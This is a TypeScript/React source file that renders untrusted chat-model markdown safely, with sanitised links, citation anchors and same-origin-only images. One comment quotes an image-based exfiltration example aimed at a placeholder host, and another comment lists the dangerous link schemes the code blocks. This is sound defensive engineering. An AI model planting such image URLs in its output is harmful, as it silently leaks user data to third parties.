// SPDX-License-Identifier: Apache-2.0

"use client";

import { useTranslations } from "next-intl";
import { type ComponentPropsWithoutRef, useState } from "react";
import Markdown, { type Components } from "react-markdown";
import remarkGfm from "remark-gfm";

import { markdownImageView, safeLinkHref } from "@/lib/security/url";

import { type Msg, pageOrigin } from "@/components/chat/chat-model";
import { CodeBlock, Icon } from "@/components/chat/chat-ui";
/* An answer image: rounded thumbnail that opens a calm full-screen lightbox.
   Security: only same-origin URLs / inline raster data become an <img>
   (markdownImageView → safeImageSrc). Anything else — e.g.
   `![x](//evil.tld/?d=secret)` — would leak data to a third party on render, so
   it is shown as a plain link the user must deliberately click (or as its alt
   text if the URL is unsafe). */
export function MarkdownImage({ src, alt, openLabel, closeLabel }: { src?: string; alt?: string; openLabel: string; closeLabel: string }) {
  const view = markdownImageView(src, alt, pageOrigin());
  const [open, setOpen] = useState(false);
  if (!view) return null;
  if (view.kind === "text") return <span className="text-ink-muted">{view.label}</span>;
  if (view.kind === "link") {
    const { href, label } = view;
    return (
      <a
        href={href}
        target="_blank"
        rel="noreferrer noopener"
        className="inline-flex items-center gap-1 font-medium text-brand underline decoration-brand/30 underline-offset-2 transition hover:decoration-brand"
      >
        <Icon name="image" className="text-sm" />
        {label}
      </a>
    );
  }
  return (
    <>
      <button
        type="button"
        onClick={() => setOpen(true)}
        aria-label={view.alt || openLabel}
        className="my-4 block overflow-hidden rounded-2xl border border-border transition hover:border-brand/40 first:mt-0 last:mb-0"
      >
        {/* eslint-disable-next-line @next/next/no-img-element */}
        <img src={view.src} alt={view.alt} loading="lazy" className="max-h-96 w-full object-contain" />
      </button>
      {open && (
        <div
          className="fixed inset-0 z-50 flex items-center justify-center bg-ink/70 p-4 backdrop-blur-sm"
          onClick={() => setOpen(false)}
          role="dialog"
          aria-modal="true"
        >
          <button
            type="button"
            onClick={() => setOpen(false)}
            aria-label={closeLabel}
            className="absolute right-4 top-4 grid h-10 w-10 place-items-center rounded-full bg-surface/90 text-ink shadow-lift transition hover:bg-surface"
          >
            <Icon name="close" className="text-xl" />
          </button>
          {/* eslint-disable-next-line @next/next/no-img-element */}
          <img
            src={view.src}
            alt={view.alt}
            className="max-h-[90vh] max-w-[92vw] rounded-2xl object-contain shadow-lift"
            onClick={(e) => e.stopPropagation()}
          />
        </div>
      )}
    </>
  );
}

// Models sometimes emit HTML <br> for line breaks; react-markdown shows them as
// literal text. Convert to real newlines (zero-dep, safer than enabling raw HTML).
export function mdClean(s: string): string {
  return s.replace(/<br\s*\/?>/gi, "\n");
}

/* Turn inline [n] citation markers into links to their source card, but only
   when a matching source exists. Presentation-only: derived for display, never
   written back to message state. */
export function linkCitations(content: string, msgId: string, sourceCount: number): string {
  if (sourceCount === 0) return content;
  return content.replace(/\[(\d+)\]/g, (full, num: string) => {
    const n = Number(num);
    return n >= 1 && n <= sourceCount ? `[${num}](#src-${msgId}-${n})` : full;
  });
}

/* The markdown component map — the heart of the "formatlama" fix. Readable
   prose, measured spacing, proper GFM tables, code blocks, links, citations,
   and click-to-zoom images. Built per-message so citations can resolve. */
export function makeMarkdownComponents(t: ReturnType<typeof useTranslations>): Components {
  return {
    p: (props) => <p className="my-3 first:mt-0 last:mb-0" {...props} />,
    h1: (props) => (
      <h2 className="mb-3 mt-6 font-display text-xl font-semibold tracking-tight text-ink first:mt-0" {...props} />
    ),
    h2: (props) => (
      <h3 className="mb-2 mt-6 font-display text-lg font-semibold tracking-tight text-ink first:mt-0" {...props} />
    ),
    h3: (props) => <h4 className="mb-2 mt-5 text-base font-semibold text-ink first:mt-0" {...props} />,
    h4: (props) => <h5 className="mb-1.5 mt-4 text-sm font-semibold text-ink first:mt-0" {...props} />,
    ul: (props) => <ul className="my-3 list-disc space-y-1.5 pl-5 first:mt-0 last:mb-0" {...props} />,
    ol: (props) => <ol className="my-3 list-decimal space-y-1.5 pl-5 first:mt-0 last:mb-0" {...props} />,
    li: (props) => <li className="leading-7 marker:text-ink-muted" {...props} />,
    strong: (props) => <strong className="font-semibold text-ink" {...props} />,
    blockquote: (props) => (
      <blockquote className="my-4 border-l-2 border-brand/40 pl-4 italic text-ink-muted first:mt-0 last:mb-0" {...props} />
    ),
    hr: () => <hr className="my-6 border-t border-border" />,
    a: ({ href: rawHref, children, ...props }) => {
      // Defence in depth on top of react-markdown's urlTransform: never emit a
      // javascript:/data:/vbscript: (or any non-http(s)/mailto) href.
      const href = safeLinkHref(rawHref, pageOrigin()) ?? undefined;
      if (!href) return <span>{children}</span>;
      const isCitation = href.startsWith("#src-");
      if (isCitation) {
        return (
          <a
            href={href}
            className="mx-0.5 inline-flex items-center justify-center rounded-full bg-brand/10 px-1.5 align-text-top text-[0.7em] font-semibold leading-none text-brand-strong no-underline transition hover:bg-brand/20"
            {...props}
          >
            {children}
          </a>
        );
      }
      return (
        <a
          href={href}
          target="_blank"
          rel="noreferrer"
          className="font-medium text-brand underline decoration-brand/30 underline-offset-2 transition hover:decoration-brand"
          {...props}
        >
          {children}
        </a>
      );
    },
    code: ({ className, children, ...props }: ComponentPropsWithoutRef<"code">) => {
      const isBlock = typeof className === "string" && className.includes("language-");
      if (isBlock) {
        return (
          <code className={`${className ?? ""} block`} {...props}>
            {children}
          </code>
        );
      }
      return (
        <code className="rounded-md bg-surface-2 px-1.5 py-0.5 font-mono text-[0.85em] text-ink" {...props}>
          {children}
        </code>
      );
    },
    pre: ({ children }) => <CodeBlock label={t("copyAnswer")}>{children}</CodeBlock>,
    table: (props) => (
      <div className="my-4 overflow-x-auto rounded-2xl border border-border first:mt-0 last:mb-0">
        <table className="w-full border-collapse text-sm" {...props} />
      </div>
    ),
    thead: (props) => <thead className="bg-surface-2" {...props} />,
    tbody: (props) => <tbody {...props} />,
    tr: (props) => <tr className="border-b border-border last:border-0 even:bg-surface-2/40" {...props} />,
    th: (props) => <th className="px-3 py-2 text-left text-xs font-semibold text-ink-muted" {...props} />,
    td: (props) => <td className="px-3 py-2 align-top text-ink" {...props} />,
    img: (props: { src?: string | Blob; alt?: string }) => (
      <MarkdownImage
        src={typeof props.src === "string" ? props.src : undefined}
        alt={props.alt}
        openLabel={t("openImage")}
        closeLabel={t("closeImage")}
      />
    ),
  };
}

/* The one renderer for untrusted markdown: model answers and the admin
   conversation viewer (widget-visitor turns). Links pass safeLinkHref, images
   markdownImageView, and raw HTML is never enabled. Guarded by
   lib/security/markdown-guard.test.ts: nothing else may import react-markdown. */
export function SafeMarkdown({ content }: { content: string }) {
  const t = useTranslations("chat");
  return (
    <Markdown remarkPlugins={[remarkGfm]} components={makeMarkdownComponents(t)}>
      {mdClean(content)}
    </Markdown>
  );
}

/* The rendered answer body: prose + citation-linked markdown + a streaming
   caret while tokens arrive. Memoizing the component map by message id keeps
   re-renders cheap during streaming. */
export function AnswerBody({ message, streaming }: { message: Msg; streaming: boolean }) {
  const count = message.sources?.length ?? 0;
  const id = message.id ?? "live";
  return (
    <div className={`text-[15px] leading-7 text-ink ${streaming ? "caret" : ""}`}>
      <SafeMarkdown content={linkCitations(message.content, id, count)} />
    </div>
  );
}
